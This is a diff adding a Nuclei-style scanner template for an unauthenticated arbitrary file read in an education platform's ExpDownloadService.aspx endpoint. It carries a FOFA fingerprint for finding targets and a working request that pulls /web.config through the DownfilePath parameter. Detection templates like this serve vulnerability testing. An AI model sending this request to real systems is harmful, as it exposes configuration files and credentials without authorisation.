@@ -1,0 +1,35 @@
+id: EDU-zhihuipingtai-ExpDownloadService_aspx-File-reading
+
+info:
+  name: "EDU 某智慧平台 ExpDownloadService.aspx 接口任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="custom/blue/uimaker/easyui.css"
+      EDU某智慧平台ExpDownloadService.aspx接口存在任意文件读取漏洞，攻击者可利用此漏洞访问敏感系统文件（如数据库配置文件、系统配置文件等），通过构造特定路径参数实现非授权文件访问，可能导致系统关键信息泄露和权限突破。该漏洞无需身份验证即可触发，存在严重的安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487811&idx=1&sn=36e8bc1f6eb545d1d3ae59c352721104&chksm=c267a470f5102d66e9df28edaa931e745d3b7064ac6bfa0c4d5540978a4475786e05ff06059c&token=65579130&lang=zh_CN#rd
+  tags: EDU 某智慧平台
+
+
+http:
+- raw:
+  - |
+    GET /ExpDownloadService.aspx?DownfilePath=/web.config HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<configuration>'
+    - '</configuration>'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
